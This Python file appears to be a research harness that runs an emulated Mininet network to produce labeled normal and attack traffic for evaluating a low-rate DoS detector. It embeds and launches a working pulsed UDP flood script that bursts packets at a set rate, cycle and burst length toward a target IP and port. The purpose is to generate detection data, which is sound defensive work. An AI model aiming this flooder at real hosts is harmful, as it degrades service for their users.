#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""

Generates test traffic com os 8 scenarios.

 - Phase 1: NORMAL block with legitimate TCP and benign background UDP traffic.
 - Phase 2:  ATTACK block with TCP, an LDoS UDP attack configured by R, T, and L,
  and benign background UDP traffic.
 - labels_intervals_test.csv with the experiment intervals and labels
  (0 = normal, 1 = attack).
 - Generates output_test_labeled.csv with the label_true column.

"""

import os
import time
from time import sleep
from datetime import datetime
import csv
import glob

from mininet.net import Mininet
from mininet.node import OVSSwitch, RemoteController
from mininet.link import TCLink

# ====== General parameters ======
RESULTS_DIR = "/home/$USER/mininet/mininet/results"

ATTACK_LOG = "/tmp/ldos_attack_h1_test.log"
LEGIT_CLIENT_LOG = "/tmp/iperf3_c_legit_test.log"

WARMUP = 5
DURATION_NORMAL = 180
DURATION_ATTACK = 180
INTER_BLOCK_SLEEP = 8

BOTTLENECK_BW = 65  # Mbps

ATTACK_PORT = 5201
LEGIT_PORT = 5202

# ====== Benign background UDP ======
BACKGROUND_UDP_RATE = 5  # Mbps of continuous benign UDP traffic
BACKGROUND_PORT = 5203
BACKGROUND_LOG = "/tmp/iperf3_bg_udp_test.log"

# ====== Python script for the LDoS attack (socket) ======
ATTACKER_SCRIPT = "/tmp/ldos_udp_attack.py"

# Table III: (R Mbps, T s, L s)
TABLE_III = [
    (95, 1.5, 0.2),
#    (65, 1.0, 0.3),
#    (65, 2.0, 0.1),
#    (65, 2.0, 0.3),
#    (80, 1.0, 0.1),
#    (80, 1.0, 0.3),
#    (80, 2.0, 0.1),
#    (80, 2.0, 0.3),
]

LABELS_TEST_CSV = os.path.join(RESULTS_DIR, "labels_intervals_test.csv")
LABELED_TEST_OUTPUT = os.path.join(
    RESULTS_DIR, "output_test_labeled.csv"
)


def ensure_attack_script():
    code = '''#!/usr/bin/env python3
# === coding: utf-8 ====
# ========= Generates a UDP LDoS attack using Python sockets, with logs in a format similar to iperf =======

import socket
import time
import sys
from datetime import datetime


def human_ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def main():
    if len(sys.argv) != 7:
        print("Usage: ldos_udp_attack.py R T L dst_ip dst_port total_duration", file=sys.stderr)
        sys.exit(1)

    # Reading of the arguments
    R = float(sys.argv[1])          # Mbps
    T = float(sys.argv[2])          # cycle (s)
    L = float(sys.argv[3])          # burst duration (s)
    dst_ip = sys.argv[4]
    dst_port = int(sys.argv[5])
    total_duration = float(sys.argv[6])

    # Package parameters
    pkt_size = 1400  # bytes (payload)
    bits_per_pkt = pkt_size * 8
    rate_bps = R * 1e6

    if rate_bps <= 0 or bits_per_pkt <= 0:
        print(f"[{human_ts()}] [LDoS] Invalid rate or packet size. R={R} Mbps, pkt_size={pkt_size} bytes",
              file=sys.stderr, flush=True)
        return

    pps = rate_bps / bits_per_pkt          # packets per second
    interval = 1.0 / pps                   # packet interval (s)

    # Socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'x' * pkt_size

    end_global = time.time() + total_duration

    print(f"[{human_ts()}] [LDoS] Attack start: "
          f"R={R:.3f} Mbps, T={T:.3f} s, L={L:.3f} s, dst={dst_ip}:{dst_port}, "
          f"total_duration={total_duration:.1f} s, pkt_size={pkt_size} bytes",
          file=sys.stderr, flush=True)

    print(f"[{human_ts()}] [LDoS] Computed pps={pps:.2f} pkts/s, interval={interval*1e3:.3f} ms",
          file=sys.stderr, flush=True)

    burst_count = 0
    total_bytes_global = 0
    bursts_info = []

    try:
        while True:
            now = time.time()
            if now >= end_global:
                break

            # Start of a burst
            burst_count += 1
            start_burst = now
            burst_bytes = 0

            print(f"[{human_ts()}] [LDoS] Burst {burst_count} START (t={start_burst:.6f})",
                  file=sys.stderr, flush=True)

            # Send traffic for L seconds
            while True:
                now = time.time()
                if now >= end_global:
                    break
                if now - start_burst >= L:
                    break

                try:
                    sock.sendto(payload, (dst_ip, dst_port))
                    burst_bytes += pkt_size
                except Exception as e:
                    print(f"[{human_ts()}] [LDoS] Error sending UDP packet: {e}",
                          file=sys.stderr, flush=True)

                if interval > 0:
                    # Approximate rate control
                    time.sleep(interval)

            end_burst = time.time()
            dur_burst = max(1e-9, end_burst - start_burst)  # avoids division by zero
            burst_bits = burst_bytes * 8
            burst_mbps = burst_bits / dur_burst / 1e6

            total_bytes_global += burst_bytes
            bursts_info.append((burst_count, dur_burst, burst_bytes, burst_mbps))

            print(f"[{human_ts()}] [LDoS] Burst {burst_count} END   (t={end_burst:.6f}) | "
                  f"duration={dur_burst:.4f} s, bytes={burst_bytes}, rate={burst_mbps:.3f} Mbps",
                  file=sys.stderr, flush=True)

            # Sleep between bursts (T - L)
            sleep_time = T - L
            if sleep_time > 0:
                now = time.time()
                if now >= end_global:
                    break
                remaining = end_global - now
                if remaining <= 0:
                    break
                time.sleep(min(sleep_time, remaining))

    except KeyboardInterrupt:
        print(f"[{human_ts()}] [LDoS] Interrupted by user (KeyboardInterrupt).",
              file=sys.stderr, flush=True)
    finally:
        sock.close()

    total_time = total_duration
    total_bits_global = total_bytes_global * 8
    avg_mbps_global = total_bits_global / total_time / 1e6 if total_time > 0 else 0.0

    print(f"[{human_ts()}] [LDoS] Attack END. Bursts={burst_count}, "
          f"total_bytes={total_bytes_global}, total_time={total_time:.3f} s, "
          f"avg_rate={avg_mbps_global:.3f} Mbps",
          file=sys.stderr, flush=True)

    
    for b_id, dur_burst, b_bytes, b_mbps in bursts_info:
        print(f"[{human_ts()}] [LDoS] SUMMARY Burst {b_id}: "
              f"duration={dur_burst:.4f} s, bytes={b_bytes}, rate={b_mbps:.3f} Mbps",
              file=sys.stderr, flush=True)


if __name__ == "__main__":
    main()
'''
    with open(ATTACKER_SCRIPT, "w", encoding="utf-8") as f:
        f.write(code)
    os.chmod(ATTACKER_SCRIPT, 0o755)
    print(f"[INFO] LDoS attack script saved to {ATTACKER_SCRIPT}")


def start_iperf_servers(h5):
    #Starts iperf3 servers on h5 (UDP for attack and TCP for legitimate traffic).
    h5.cmd(
        "nohup iperf3 -s -p %d >/tmp/iperf3_s_%d_test.log 2>&1 &"
        % (ATTACK_PORT, ATTACK_PORT)
    )
    if LEGIT_PORT != ATTACK_PORT:
        h5.cmd(
            "nohup iperf3 -s -p %d >/tmp/iperf3_s_%d_test.log 2>&1 &"
            % (LEGIT_PORT, LEGIT_PORT)
        )
    # Background UDP server
    if BACKGROUND_PORT not in (ATTACK_PORT, LEGIT_PORT):
        h5.cmd(
            "nohup iperf3 -s -p %d >/tmp/iperf3_s_%d_bg_test.log 2>&1 &"
            % (BACKGROUND_PORT, BACKGROUND_PORT)
        )


def run_one_block(
    attack_params,
    duration,
    attack_mode=False,
    bottleneck=BOTTLENECK_BW,
    legit_tcp_limit=30,
):
    #Runs a block (normal or attack) for attack_params=(R, T, L).
    
    R, T, L = attack_params
    ATTACK_RATE = R
    ATTACK_CYCLE = T
    ATTACK_BURST = L
    ATTACK_SLEEP = max(0.0, ATTACK_CYCLE - ATTACK_BURST)

    print(
        "\n>>> Executing block: attack_params=%s | attack_mode=%s | duration=%ds"
        % (str(attack_params), str(attack_mode), duration)
    )

    net = Mininet(
        controller=RemoteController, switch=OVSSwitch, autoSetMacs=True, link=TCLink
    )

    # =========================
    # Hosts
    # =========================
    h1 = net.addHost("h1")  # Attacker 1 - Brasília
    h2 = net.addHost("h2")  # Attacker 2 - Curitiba
    h3 = net.addHost("h3")  # Legitimate TCP host - Porto Alegre
    h4 = net.addHost("h4")  # Legitimate UDP host - Florianópolis
    h5 = net.addHost("h5")  # Victim - Rio de Janeiro

    # =========================
    # Switches
    # =========================
    s_brasilia = net.addSwitch("s1")
    s_curitiba = net.addSwitch("s2")
    s_porto_alegre = net.addSwitch("s3")
    s_floripa = net.addSwitch("s4")
    s_sao_paulo = net.addSwitch("s6")
    s_rio = net.addSwitch("s7")

    # =========================
    # Links host-switch (100 Mbps)
    # =========================
    net.addLink(h1, s_brasilia, bw=100)
    net.addLink(h2, s_curitiba, bw=100)
    net.addLink(h3, s_porto_alegre, bw=100)
    net.addLink(h4, s_floripa, bw=100)
    net.addLink(h5, s_rio, bw=100)

    # =========================
    # Backbone
    # =========================
    net.addLink(s_brasilia, s_sao_paulo, bw=100)
    net.addLink(s_curitiba, s_sao_paulo, bw=100)
    net.addLink(s_porto_alegre, s_floripa, bw=100)
    net.addLink(s_floripa, s_sao_paulo, bw=100)
    net.addLink(s_sao_paulo, s_rio, bw=bottleneck, delay="20ms")

    net.addController(
        "c0", controller=RemoteController, ip="127.0.0.1", port=6653
    )

    net.build()
    net.start()

    try:
        ip_h5 = h5.IP()

        start_iperf_servers(h5)
        sleep(1)

        # Legitimate TCP throughout the block
        h3.cmd(
            "nohup iperf3 -c %s -p %d -t %d -i 1 >%s 2>&1 &"
            % (ip_h5, LEGIT_PORT, duration, LEGIT_CLIENT_LOG)
        )
        print("[INFO] Legitimate TCP traffic started (duration %ds)." % duration)

        # Benign background UDP 
        h4.cmd(
            "nohup iperf3 -c %s -u -b %dM -t %d -p %d >%s 2>&1 &"
            % (
                ip_h5,
                BACKGROUND_UDP_RATE,
                duration,
                BACKGROUND_PORT,
                BACKGROUND_LOG,
            )
        )
        print(
            "[INFO] Benign background UDP traffic started: %d Mbps na porta %d (duration %ds)."
            % (BACKGROUND_UDP_RATE, BACKGROUND_PORT, duration)
        )

        # UDP LDoS attack using the Python socket script, if attack_mode=True
        if attack_mode:
            # R, T, L, ip_h5, ATTACK_PORT, duration
            attack_cmd = (
                "nohup python3 %s %f %f %f %s %d %d >%s 2>&1 &"
                % (
                    ATTACKER_SCRIPT,
                    ATTACK_RATE,
                    ATTACK_CYCLE,
                    ATTACK_BURST,
                    ip_h5,
                    ATTACK_PORT,
                    duration,
                    ATTACK_LOG,
                )
            )
            h1.cmd(attack_cmd)
            print(
                "[INFO] LDoS attack (socket) started: R=%.1fM, T=%.2fs, L=%.2fs"
                % (ATTACK_RATE, ATTACK_CYCLE, ATTACK_BURST)
            )
            print(f"[DEBUG] command h1: {attack_cmd}")

        ts_start = datetime.now()
        sleep(duration + 2)
        ts_end = datetime.now()

        print("[INFO] Block finished. Cleaning up processes...")
        for h in (h1, h2, h3, h4, h5):
            h.cmd("pkill -f iperf3 || true")
            h.cmd("pkill -f timeout || true")
            h.cmd("pkill -f ldos_udp_attack.py || true")

    except Exception as e:
        print("[ERROR] during block execution: %s" % e)
        ts_start = ts_end = datetime.now()
    finally:
        try:
            net.stop()
        except Exception:
            pass

    return ts_start.isoformat(sep=" "), ts_end.isoformat(sep=" ")


def main():
    os.makedirs(RESULTS_DIR, exist_ok=True)

    # Ensures the attack script exists before starting the blocks.
    ensure_attack_script()

    intervals = []

    print(">>> Initial warm-up: %d s" % WARMUP)
    sleep(WARMUP)

    # ===== PHASE 1: just 1 NORMAL block =====
    print("\n=== PHASE 1: SINGLE NORMAL BLOCK (Table III) ===")
    params = TABLE_III[0]
    idx = 1
    start_iso, end_iso = run_one_block(
        params,
        DURATION_NORMAL,
        attack_mode=False,
        bottleneck=BOTTLENECK_BW,
        legit_tcp_limit=30,
    )
    intervals.append(
        {
            "scenario_idx": idx,
            "attack_rate": params[0],
            "attack_cycle": params[1],
            "attack_burst": params[2],
            "phase": "NORMAL",
            "start": start_iso,
            "end": end_iso,
            "label": 0,
        }
    )
    print(
        "[INFO] Single NORMAL block saved: %s -> %s"
        % (start_iso, end_iso)
    )

    print("\n>>> Global pause between phases: %ds" % INTER_BLOCK_SLEEP)
    sleep(INTER_BLOCK_SLEEP)

    print("\n=== PHASE 2: ALL ATTACK BLOCKS (Table III) ===")
    for idx, params in enumerate(TABLE_III, start=1):
        start_iso, end_iso = run_one_block(
            params,
            DURATION_ATTACK,
            attack_mode=True,
            bottleneck=BOTTLENECK_BW,
            legit_tcp_limit=30,
        )
        intervals.append(
            {
                "scenario_idx": idx,
                "attack_rate": params[0],
                "attack_cycle": params[1],
                "attack_burst": params[2],
                "phase": "ATTACK",
                "start": start_iso,
                "end": end_iso,
                "label": 1,
            }
        )
        print(
            "[INFO] Bloco ATTACK %d saved: %s -> %s"
            % (idx, start_iso, end_iso)
        )
        print(
            "[INFO] Waiting %ds before the next block..."
            % INTER_BLOCK_SLEEP
        )
        sleep(INTER_BLOCK_SLEEP)

    # ===== Salva intervals de teste =====
    print("\n>>> Saving test intervals to: %s" % LABELS_TEST_CSV)
    with open(LABELS_TEST_CSV, "w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh)
        w.writerow(
            [
                "scenario_idx",
                "attack_rate",
                "attack_cycle",
                "attack_burst",
                "phase",
                "start",
                "end",
                "label",
            ]
        )
        for it in intervals:
            w.writerow(
                [
                    it["scenario_idx"],
                    it["attack_rate"],
                    it["attack_cycle"],
                    it["attack_burst"],
                    it["phase"],
                    it["start"],
                    it["end"],
                    it["label"],
                ]
            )

    # ===== Collector CSV Labeling (TEST) =====
    print("\n>>> Searching for collector CSV...")
    pattern = os.path.join(RESULTS_DIR, "output_*.csv")
    candidates = sorted(glob.glob(pattern), key=os.path.getmtime)
    if not candidates:
        print(
            "[WARNING] No CSV from collector found in %s (pattern output_collect_*.csv)."
            % RESULTS_DIR
        )
        print(
            "[WARNING] The script generated only labels_intervals_test.csv for manual labeling."
        )
        return

    collector_csv = candidates[-1]
    print("\n>>> Collector CSV found: %s" % collector_csv)
    print("    Generating labeled test CSV: %s" % LABELED_TEST_OUTPUT)

    import pandas as pd

    df = pd.read_csv(collector_csv, low_memory=False)
    ts_cols = [c for c in df.columns if "timestamp" in c.lower()]
    if not ts_cols:
        print("[ERROR] Timestamp column not found in the collector CSV.")
        print("[WARNING] Use labels_intervals_test.csv for manual labeling.")
        return
    ts_col = ts_cols[0]

    df[ts_col] = pd.to_datetime(df[ts_col], errors="coerce")
    if getattr(df[ts_col].dt, "tz", None) is not None:
        df[ts_col] = df[ts_col].dt.tz_localize(None)

    print(
        "[DEBUG] CSV collector range: %s -> %s"
        % (str(df[ts_col].min()), str(df[ts_col].max()))
    )

    df["label_true"] = -1
    labeled_counts = 0

    for it in intervals:
        start = pd.to_datetime(it["start"], errors="coerce")
        end = pd.to_datetime(it["end"], errors="coerce")
        try:
            if start.tzinfo is not None:
                start = start.tz_localize(None)
            if end.tzinfo is not None:
                end = end.tz_localize(None)
        except Exception:
            pass

        mask = (df[ts_col] >= start) & (df[ts_col] < end)
        count_block = int(mask.sum())
        if count_block > 0:
            df.loc[mask, "label_true"] = it["label"]
            labeled_counts += count_block
        print(
            "[DEBUG] Block %s %s..%s -> %d rows labele"
            % (it["phase"], str(start), str(end), count_block)
        )

    num_total = len(df)
    labeled_df = df[df["label_true"] != -1].copy()
    num_labeled = len(labeled_df)

    print(
        "[INFO] Total lines in the collector CSV: %d. Labeled lines: %d."
        % (num_total, num_labeled)
    )
    if num_labeled == 0:
        print(
            "[ALERT] There was no intersection between the intervals and the CSV timestamps."
        )
        print(
            "         Check the OS/Mininet time zone and the collector's timestamp format."
        )

    labeled_df.to_csv(LABELED_TEST_OUTPUT, index=False)
    print("[OK] Labeled test CSV saved to: %s" % LABELED_TEST_OUTPUT)
    print("Ready to evaluate the model in Jupyter using label_true.")


if __name__ == "__main__":
    main()

#EOF

